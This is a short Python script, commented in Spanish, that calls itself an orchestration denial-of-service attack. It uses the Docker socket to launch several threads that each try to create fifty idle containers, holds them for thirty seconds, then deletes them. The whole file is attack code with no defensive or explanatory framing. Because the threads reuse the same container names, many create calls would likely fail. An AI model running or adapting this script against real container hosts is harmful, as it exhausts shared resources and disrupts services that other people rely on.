import docker
import time
import threading

def orchestration_dos_attack():
    try:
        client = docker.DockerClient(base_url='unix:///var/run/docker.sock')
        
        def create_containers():
            for i in range(50):  # Crear 50 contenedores
                try:
                    container = client.containers.run(
                        "alpine",
                        "tail -f /dev/null",  # Mantener contenedor activo
                        detach=True,
                        name=f"dos_container_{i}"
                    )
                    print(f"[+] Contenedor creado: {container.name}")
                except Exception as e:
                    print(f"[-] Error creando contenedor: {str(e)}")
        
        # Iniciar múltiples hilos para crear contenedores
        threads = []
        for _ in range(5):  # 5 hilos concurrentes
            t = threading.Thread(target=create_containers)
            threads.append(t)
            t.start()
        
        # Esperar a que todos los hilos terminen
        for t in threads:
            t.join()
        
        print("[+] Ataque de saturación completado")
        
        # Mantener los contenedores activos durante 30 segundos
        time.sleep(30)
        
        # Limpiar
        containers = client.containers.list(filters={"name": "dos_container"})
        for container in containers:
            container.stop()
            container.remove()
            print(f"[+] Contenedor eliminado: {container.name}")
            
    except Exception as e:
        print(f"[-] Error: {str(e)}")

if __name__ == "__main__":
    orchestration_dos_attack()